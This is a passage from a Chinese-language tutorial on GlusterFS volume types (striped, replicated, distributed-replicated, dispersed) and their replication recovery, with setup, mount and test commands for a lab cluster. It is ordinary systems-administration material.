<h4 id="查看挂载情况-1"><a href="#查看挂载情况-1" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已挂载卷的容量是3个brick容量之和</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/15.png" alt="img"></p>
<h4 id="存储测试-1"><a href="#存储测试-1" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/stripe/</span></span><br><span class="line">[root@glusterfs-client stripe]<span class="comment"># touch stripe&#123;1..6&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向strip1.txt文件写入内容</span></span><br><span class="line">[root@glusterfs-client stripe]<span class="comment"># echo "this is stripe1.txt" &gt;&gt; strip1.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/str_volume/</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># cat /brick1/str_volume/strip1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/16.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/str_volume/</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># cat /brick2/str_volume/strip1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/17.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs03节点</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># tree /brick3/str_volume/</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># cat /brick3/str_volume/strip1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/18.png" alt="img"></p>
<p><strong>结论：条带卷将1个文件分片存储在多个brick server，但并无副本。</strong></p>
<h2 id="复制卷"><a href="#复制卷" class="headerlink" title="复制卷"></a>复制卷</h2><p>复制卷（Replicated Glusterfs Volume，又称AFR（Auto File Replication）），特点如下：</p>
<ol>
<li>每个文件同步复制镜像到多个brick，相当于文件级raid1；</li>
<li>副本数量通常设置为2或3，设置的副本数量需要是brick数量（至少为2）的倍数（如2台brick server，可设置副本数为2/4/6/…；如3台brick server，可设置副本数为3/6/9/…；依次类推），且每个brick的容量相等；</li>
<li>读性能提升，写性能下降，因为<strong>glusterfs的复制是同步事务操作，即写文件时，先把这个文件锁住，然后同时写两个或多个副本，写完后解锁，操作结束</strong>（ceph采用异步写副本，即写到一个主OSD便返回，这个OSD再通过内部网络异步写到其余OSD）；</li>
<li>通常与分布式卷或条带卷组合使用，解决前两者的冗余问题；</li>
<li>提升数据可靠性，但磁盘利用率低；</li>
<li>副本数设置为2时，可能会有脑裂（Split-brain）的风险（风险提示，但可配置），主要因在两个副本不一致时，无法仲裁以哪个副本为准，解决方案是加入仲裁或者设置3副本。</li>
</ol>
<p><img src="/articles/35de9bb2/19.png" alt="img"></p>
<h4 id="创建复制卷"><a href="#创建复制卷" class="headerlink" title="创建复制卷"></a>创建复制卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create NEW-VOLNAME [replica COUNT] [transport [tcp | rdma | tcp,rdma]] NEW-BRICK...</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 创建名为”replica-volume”的逻辑卷；</span></span><br><span class="line"><span class="comment"># 必须指定卷类型（默认为分布式卷）与对应的副本数量，数量需要与后续使用brick server数量对等；</span></span><br><span class="line"><span class="comment"># “transport tcp”指定集群通信方式；</span></span><br><span class="line"><span class="comment"># 副本数为2时，有脑裂风险提示，提示采用3副本或仲裁机制，验证环境略过即可</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create replica-volume replica 2 transport tcp glusterfs01:/brick1/repl_volume glusterfs02:/brick2/repl_volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/20.png" alt="img"></p>
<h4 id="启动卷-2"><a href="#启动卷-2" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start replica-volume</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info replica-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/21.png" alt="img"></p>
<h4 id="client挂载-2"><a href="#client挂载-2" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/replica</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:replica-volume /mnt/replica/</span></span><br></pre></td></tr></table></figure>

<h4 id="查看挂载情况-2"><a href="#查看挂载情况-2" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已挂载卷的容量是1个brick的容量</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/22.png" alt="img"></p>
<h4 id="存储测试-2"><a href="#存储测试-2" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/replica/</span></span><br><span class="line">[root@glusterfs-client replica]<span class="comment"># touch replica&#123;1..4&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向replica1.txt文件写入内容</span></span><br><span class="line">[root@glusterfs-client replica]<span class="comment"># echo "this is replica1.txt" &gt;&gt; replica1.txt</span></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/repl_volume/</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># cat /brick1/repl_volume/replica1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/23.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/repl_volume/</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># cat /brick2/repl_volume/replica1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/24.png" alt="img"></p>
<p><strong>结论：复制卷将1个文件同步镜像到多个brick server，数据有冗余备份。</strong></p>
<h4 id="AFR恢复原理"><a href="#AFR恢复原理" class="headerlink" title="AFR恢复原理"></a>AFR恢复原理</h4><p>数据恢复只针对复制卷，AFR数据修复主要涉及三个方面：ENTRY，META，DATA。</p>
<p>记录描述副本状态的称之为<strong>ChangeLog</strong>，记录在每个副本文件扩展属性里，读入内存后以矩阵形式判断是否需要修复以及要以哪个副本为Source进行修复；初始值以及正常值为0（注：ENTRY和META,DATA分布对应着一个数值）。</p>
<p>以冗余度为2，即含有2个副本A和B的DATA修复为例，write的步骤分解为：</p>
<ol>
<li>下发Write操作；</li>
<li>加锁Lock；</li>
<li>向A，B副本的ChangeLog分别加1，记录到各副本的扩展属性中；</li>
<li>对A，B副本进行写操作；</li>
<li>若副本写成功则ChangeLog减1，若该副本写失败则ChangLog值不变，记录到各个副本的扩展属性中；</li>
<li>解锁UnLock；</li>
<li>向上层返回，只要有一个副本写成功就返回成功。 </li>
</ol>
<p>上述操作在AFR中是完整的一个transaction动作，根据两个副本记录的ChangeLog的数值确定了副本的几种状态：</p>
<ol>
<li>WISE：智慧的，即该副本的ChangeLog中对应的值是0，而另一副本对应的数值大于0；</li>
<li>INNOCENT：无辜的，即两副本的ChangeLog对应的值都是0；</li>
<li>FOOL：愚蠢的，即该副本的ChangeLog对应的值大于是0，而另一副本对应的数值是0；</li>
<li>IGNORANT，忽略的，即该副本的ChangeLog丢失。</li>
</ol>
<p>恢复分以下场景：</p>
<ol>
<li><p>1个节点changelog状态为WISE，其余节点为FOOL或其他非WISE状态，以WISE节点去恢复其他节点；</p>
</li>
<li><p>所有节点是IGNORANT状态，手动触发heal，通过命令以UID最小的文件作为source，去恢复大小为0的其他文件；</p>
</li>
<li><p>多个状态是WISE时，即出现脑裂状态，脑裂的文件通常读不出来，报”Input/Output error”，可查看日志/var/log/glusterfs/glustershd.log。</p>
<p>脑裂原理及解决方案：[<a href="https://docs.gluster.org/en/latest/Administrator%20Guide/Split%20brain%20and%20ways%20to%20deal%20with%20it/]" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator%20Guide/Split%20brain%20and%20ways%20to%20deal%20with%20it/]</a>(<a href="https://docs.gluster.org/en/latest/Administrator" target="_blank" rel="noopener">https://docs.gluster.org/en/latest/Administrator</a> Guide/Split brain and ways to deal with it/)</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过命令查看副本文件的扩展属性：getfattr -m . -d -e hex [filename]</span></span><br><span class="line"><span class="comment"># “trusted.afr.xxx”部分即扩展属性，值是24bit，分3部分，依次标识DATA ，META， ENTRY 3者的changelog</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># getfattr -m . -d -e hex /brick1/repl_volume/replica1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/25.png" alt="img"></p>
<h2 id="分布式复制卷"><a href="#分布式复制卷" class="headerlink" title="分布式复制卷"></a>分布式复制卷</h2><p>分布式复制卷（Distributed Replicated Glusterfs Volume），是分布式卷与复制卷的组合，兼具两者的功能，特点如下：</p>
<ol>
<li>若干brick组成1个复制卷，另外若干brick组成其他复制卷；单个文件在复制卷内数据保持副本，不同文件在不同复制卷之间进行哈希分布；即分布式卷跨复制卷集（replicated sets ）；</li>
<li>brick server数量是副本数量的倍数，且&gt;=2倍，即最少需要4台brick server，同时组建复制卷集的brick容量相等。</li>
</ol>
<p><img src="/articles/35de9bb2/26.png" alt="img"></p>
<h4 id="创建分布式复制卷"><a href="#创建分布式复制卷" class="headerlink" title="创建分布式复制卷"></a>创建分布式复制卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create NEW-VOLNAME [replica COUNT] [transport [tcp | rdma | tcp,rdma]] NEW-BRICK...</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 创建名为”distributed-replica-volume”的逻辑卷；</span></span><br><span class="line"><span class="comment"># 必须指定卷类型（默认为分布式卷）与对应的副本数量，brick server数量是副本数量的倍数，且&gt;=2倍；</span></span><br><span class="line"><span class="comment"># 不需要指出分布式卷类型，只要副本数量与brick server数量不等且符合倍数关系，即是分布式复制卷；</span></span><br><span class="line"><span class="comment"># “transport tcp”指定集群通信方式；</span></span><br><span class="line"><span class="comment"># 副本数为2时，有脑裂风险提示，提示采用3副本或仲裁机制，验证环境略过即可</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create distributed-replica-volume replica 2 transport tcp \</span></span><br><span class="line"> glusterfs01:/brick1/dis_repl_volume \</span><br><span class="line"> glusterfs02:/brick2/dis_repl_volume \</span><br><span class="line"> glusterfs03:/brick3/dis_repl_volume \</span><br><span class="line"> glusterfs04:/brick4/dis_repl_volume</span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/27.png" alt="img"></p>
<h4 id="启动卷-3"><a href="#启动卷-3" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 卷类型：分布式复制卷</span></span><br><span class="line"><span class="comment"># “Number of Bricks”：2副本，2个副本集（replicated sets ），4个brick server</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start distributed-replica-volume</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info distributed-replica-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/28.png" alt="img"></p>
<h4 id="client挂载-3"><a href="#client挂载-3" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/distributed-replica</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:distributed-replica-volume /mnt/distributed-replica/</span></span><br></pre></td></tr></table></figure>

<h4 id="查看挂载情况-3"><a href="#查看挂载情况-3" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已挂载卷的容量是2个副本集（replicated sets ）容量之和</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/29.png" alt="img"></p>
<h4 id="存储测试-3"><a href="#存储测试-3" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/distributed-replica/</span></span><br><span class="line">[root@glusterfs-client distributed-replica]<span class="comment"># touch distributed-replica&#123;1..6&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向distributed-replica1.txt文件写入内容</span></span><br><span class="line">[root@glusterfs-client distributed-replica]<span class="comment"># echo "this is distributed-replica1.txt" &gt;&gt; distributed-replica1.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/dis_repl_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/30.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/dis_repl_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/31.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs03节点</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># tree /brick3/dis_repl_volume/</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># cat /brick3/dis_repl_volume/distributed-replica1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/32.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs04节点</span></span><br><span class="line">[root@glusterfs04 ~]<span class="comment"># tree /brick4/dis_repl_volume/</span></span><br><span class="line">[root@glusterfs04 ~]<span class="comment"># cat /brick4/dis_repl_volume/distributed-replica1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/33.png" alt="img"></p>
<p><strong>结论：分布式复制卷将数据文件分布在多个复制集（replicated sets ）中，每个复制集中数据有镜像冗余。</strong></p>
<h2 id="分布式条带卷（Deprecated）"><a href="#分布式条带卷（Deprecated）" class="headerlink" title="分布式条带卷（Deprecated）"></a>分布式条带卷（Deprecated）</h2><p>分布式条带卷（Distributed Striped Glusterfs Volume），是分布式卷与条带卷的组合，兼具两者的功能，特点如下：</p>
<ol>
<li>若干brick组成1个条带卷，另外若干brick组成其他条带卷；单个文件在条带卷内数据以条带的形式存储，不同文件在不同条带卷之间进行哈希分布；即分布式卷跨条带卷；</li>
<li>brick server数量是条带数的倍数，且&gt;=2倍，即最少需要4台brick server。</li>
</ol>
<p><img src="/articles/35de9bb2/34.png" alt="img"></p>
<h4 id="创建分布式条带卷"><a href="#创建分布式条带卷" class="headerlink" title="创建分布式条带卷"></a>创建分布式条带卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create NEW-VOLNAME [stripe COUNT] [transport [tcp | rdma | tcp,rdma]] NEW-BRICK...</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 创建名为”distributed-stripe-volume”的逻辑卷；</span></span><br><span class="line"><span class="comment"># 必须指定卷类型（默认为分布式卷）与对应的条带数，brick server数量是条带数量的倍数，且&gt;=2倍；</span></span><br><span class="line"><span class="comment"># 不需要指出分布式卷类型，只要条带数量与brick server数量不等且符合倍数关系，即是分布式复制卷；</span></span><br><span class="line"><span class="comment"># “transport tcp”指定集群通信方式；</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create distributed-stripe-volume stripe 2 transport tcp \</span></span><br><span class="line"> glusterfs01:/brick1/dis_str_volume \</span><br><span class="line"> glusterfs02:/brick2/dis_str_volume \</span><br><span class="line"> glusterfs03:/brick3/dis_str_volume \</span><br><span class="line"> glusterfs04:/brick4/dis_str_volume</span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/35.png" alt="img"></p>
<h4 id="启动卷-4"><a href="#启动卷-4" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 卷类型：分布式条带卷</span></span><br><span class="line"><span class="comment"># “Number of Bricks”：2分布集，2条带集（replicated sets ），4个brick server</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start distributed-stripe-volume</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info distributed-stripe-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/36.png" alt="img"></p>
<h4 id="client挂载-4"><a href="#client挂载-4" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/distributed-stripe</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:distributed-stripe-volume /mnt/distributed-stripe/</span></span><br></pre></td></tr></table></figure>

<h4 id="查看挂载情况-4"><a href="#查看挂载情况-4" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已挂载卷的容量是4个brick容量之和</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/37.png" alt="img"></p>
<h4 id="存储测试-4"><a href="#存储测试-4" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/distributed-stripe/</span></span><br><span class="line">[root@glusterfs-client distributed-stripe]<span class="comment"># touch distributed-stripe&#123;1..6&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向distributed-stripe1.txt文件写入内容</span></span><br><span class="line">[root@glusterfs-client distributed-stripe]<span class="comment"># echo "this is distributed-stripe1.txt" &gt;&gt; distributed-stripe1.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/dis_str_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/38.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/dis_str_volume/</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/39.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs03节点</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># tree /brick3/dis_str_volume/</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># cat /brick3/dis_str_volume/distributed-stripe1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/40.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs04节点</span></span><br><span class="line">[root@glusterfs04 ~]<span class="comment"># tree /brick4/dis_str_volume/</span></span><br><span class="line">[root@glusterfs04 ~]<span class="comment"># cat /brick4/dis_str_volume/distributed-stripe1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/41.png" alt="img"></p>
<p><strong>结论：分布式条带卷将数据文件分布在多个条带集中，每个条带集中数据再以条带的形式存储在对应条带集中的全部brick上，数据无冗余备份。</strong></p>
<h2 id="条带镜像卷（Deprecated）"><a href="#条带镜像卷（Deprecated）" class="headerlink" title="条带镜像卷（Deprecated）"></a>条带镜像卷（Deprecated）</h2><p>条带复制卷（STRIPE REPLICA Volume），是条带与复制卷的组合，兼具两者的功能，特点如下：</p>
<ol>
<li>若干brick组成1个复制卷，另外若干brick组成其他复制卷；单个文件以条带的形式存储在2个或多个复制集（replicated sets ），复制集内文件分片以副本的形式保存；相当于文件级raid01；</li>
<li>brick server数量是副本数的倍数，且&gt;=2倍，即最少需要4台brick server。</li>
</ol>
<p><img src="/articles/35de9bb2/42.png" alt="img"></p>
<h2 id="分布式条带镜像卷（Deprecated）"><a href="#分布式条带镜像卷（Deprecated）" class="headerlink" title="分布式条带镜像卷（Deprecated）"></a>分布式条带镜像卷（Deprecated）</h2><p>分布式条带复制卷（DISTRIBUTE STRIPE REPLICA VOLUME），是分布式卷，条带与复制卷的组合，兼具三者的功能，特点如下：</p>
<ol>
<li>多个文件哈希分布到到多个条带集中，单个文件在条带集中以条带的形式存储在2个或多个复制集（replicated sets ），复制集内文件分片以副本的形式保存；</li>
<li>brick server数量是副本数的倍数，且&gt;=2倍，即最少需要4台brick server。</li>
</ol>
<p><img src="/articles/35de9bb2/43.png" alt="img"></p>
<h2 id="纠删卷"><a href="#纠删卷" class="headerlink" title="纠删卷"></a>纠删卷</h2><p>纠删卷（Dispersed Volumes）是v3.6版本后发布的一种volume特点如下：</p>
<ol>
<li>基于纠删码（erasure codes， EC）实现，类似于raid5/6（取决于redundancy等级）；</li>
<li>通过配置redundancy（冗余）级别提高可靠性，在保证较高的可靠性同时，可以提升物理存储空间的利用率；</li>
<li>文件被分割成大小相同的chunk(块)，每个chunk又被分割成fragment，冗余信息的fragment随之生成，且同一个fragment只会保存一个brick上；</li>
<li>redundancy均匀分布存储在所有的brick，逻辑卷的有效空间是<usable size> = <brick size> * (#bricks - redundancy)；</brick></usable></li>
<li>在数据恢复时，只要(#bricks - redundancy)个fragment（数据或冗余信息）可用，就能正常恢复数据；</li>
<li>卷中所有brick容量需要相同，否则最小的brick满容量时，数据无法写入；</li>
<li>实际部署时，redundancy &lt; #bricks / 2 (or equivalently, redundancy * 2 &lt; #bricks)，即brick至少是3个；redundancy设置为0时，DispersedVolume等同于分布式卷；若redundancy设置为brick/2时，DispersedVolume等同于复制卷。</li>
</ol>
<h4 id="创建纠删卷"><a href="#创建纠删卷" class="headerlink" title="创建纠删卷"></a>创建纠删卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令：gluster volume create [disperse [&lt;count&gt;]] [redundancy &lt;count&gt;] [transport tcp | rdma | tcp,rdma]</span></span><br><span class="line"><span class="comment"># 以上命令在任意server节点操作均可，以glusterfs01节点为例；</span></span><br><span class="line"><span class="comment"># 创建名为”disperse-volume”的逻辑卷；</span></span><br><span class="line"><span class="comment"># 必须指定卷类型（默认为分布式卷）与对应的brick server数量；</span></span><br><span class="line"><span class="comment"># 冗余等级”redundancy”需要根据使用brick server数量(“disperse conunt”)，并结合期望的冗余度数综合考量；</span></span><br><span class="line"><span class="comment"># 也可不设置冗余等级”redundancy”，系统会根据brick server数量(“disperse conunt”)自动计算最优值，确认即可；如disperse conunt=3，则redundancy=1（无“warning message”）；disperse conunt=6，则redundancy=2（有“warning message”）；但disperse conunt=4，则无最优值，此时使用默认redundancy=1（有“warning message”）；</span></span><br><span class="line"><span class="comment"># “transport tcp”指定集群通信方式，默认即tcp；</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume create disperse-volume disperse 3 transport tcp \</span></span><br><span class="line"> glusterfs01:/brick1/disperse_volume \</span><br><span class="line"> glusterfs02:/brick2/disperse_volume \</span><br><span class="line"> glusterfs03:/brick3/disperse_volume</span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/44.png" alt="img"></p>
<h4 id="启动卷-5"><a href="#启动卷-5" class="headerlink" title="启动卷"></a>启动卷</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 卷类型：disperse卷</span></span><br><span class="line"><span class="comment"># “Number of Bricks”：rudundancy=1，3个brick server</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume start disperse-volume</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># gluster volume info disperse-volume</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/45.png" alt="img"></p>
<h4 id="client挂载-5"><a href="#client挂载-5" class="headerlink" title="client挂载"></a>client挂载</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@glusterfs-client ~]<span class="comment"># mkdir /mnt/disperse</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># mount.glusterfs 172.30.200.51:disperse-volume /mnt/disperse/</span></span><br></pre></td></tr></table></figure>

<h4 id="查看挂载情况-5"><a href="#查看挂载情况-5" class="headerlink" title="查看挂载情况"></a>查看挂载情况</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 已挂载卷的容量是2个brick容量之和，&lt;usable size&gt; = &lt;brick size&gt; * (#bricks - redundancy)</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># df -Th</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/46.png" alt="img"></p>
<h4 id="存储测试-5"><a href="#存储测试-5" class="headerlink" title="存储测试"></a>存储测试</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在client的挂载目录下创建若干文件</span></span><br><span class="line">[root@glusterfs-client ~]<span class="comment"># cd /mnt/disperse/</span></span><br><span class="line">[root@glusterfs-client disperse]<span class="comment"># touch disperse&#123;1..4&#125;.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向distributed-replica1.txt文件写入内容</span></span><br><span class="line">[root@glusterfs-client disperse]<span class="comment"># echo "this is disperse1.txt" &gt;&gt; disperse1.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># glusterfs01节点</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># tree /brick1/disperse_volume/</span></span><br><span class="line">[root@glusterfs01 ~]<span class="comment"># cat /brick1/disperse_volume/disperse1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/47.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs02节点</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># tree /brick2/disperse_volume/</span></span><br><span class="line">[root@glusterfs02 ~]<span class="comment"># cat /brick2/disperse_volume/disperse1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/48.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># glusterfs03节点</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># tree /brick3/disperse_volume/</span></span><br><span class="line">[root@glusterfs03 ~]<span class="comment"># cat /brick3/disperse_volume/disperse1.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/articles/35de9bb2/49.png" alt="img"></p>
<p><strong>结论：纠删卷将数据文件（含冗余信息）分布在多个brick中，数据有冗余。</strong></p>
<h2 id="分布式纠删卷"><a href="#分布式纠删卷" class="headerlink" title="分布式纠删卷"></a>分布式纠删卷</h2><p>分布式纠删卷（Distributed Dispersed Volumes）等效于分布式复制卷，但使用的是纠删子卷，而非复制子卷。</p>
<h1 id="Glusterfs管理"><a href="#Glusterfs管理" class="headerlink" title="Glusterfs管理"></a>Glusterfs管理</h1><h2 id="均衡卷"><a href="#均衡卷" class="headerlink" title="均衡卷"></a>均衡卷</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不迁移数据</span></span><br><span class="line">gluster volume VOLNAME rebalance [fix-layout start | start | startforce | status | stop]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修复卷（只针对复制卷）</span></span><br><span class="line">gluster volume heal REPLICATE-VOLNAME/DISPERSE-VOLNAME       <span class="comment">#只修复有问题的文件  </span></span><br><span class="line">gluster volume heal REPLICATE-VOLNAME/DISPERSE-VOLNAME full    <span class="comment">#修复所有文件  </span></span><br><span class="line">gluster volume heal REPLICATE-VOLNAME/DISPERSE-VOLNAME info    <span class="comment">#查看自愈详情  </span></span><br><span class="line">gluster volume heal REPLICATE-VOLNAME/DISPERSE-VOLNAME info healed|heal-failed|split-brain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置卷</span></span><br><span class="line">gluster volume <span class="built_in">set</span> options</span><br></pre></td></tr></table></figure>

